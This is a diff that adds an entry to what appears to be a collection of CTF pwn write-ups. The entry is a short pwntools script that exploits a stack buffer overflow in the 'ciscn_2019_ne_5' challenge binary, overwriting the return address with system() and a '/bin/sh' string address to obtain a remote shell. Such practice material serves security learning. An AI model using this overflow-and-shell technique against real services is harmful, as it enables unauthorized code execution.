@@ -639,6 +639,23 @@ icon: icon-html
   r.interactive()
   ```
 
+* ### ciscn_2019_ne_5
+
+  ```python
+  from pwn import *
+  r = remote('pwn.buuoj.cn',20171)
+  r.sendline('administrator')
+  elf = ELF('./ciscn_2019_ne_5')
+  system = elf.symbols['system']
+  binsh = 0x080482ea
+  payload = 'a'*76+p32(system)+p32(0xdeadbeef)+p32(binsh)
+  r.sendline('1')
+  r.recvuntil('Please input new log info:')
+  r.sendline(payload)
+  r.sendline('4')
+  r.interactive()
+  ```
+
   
 
 
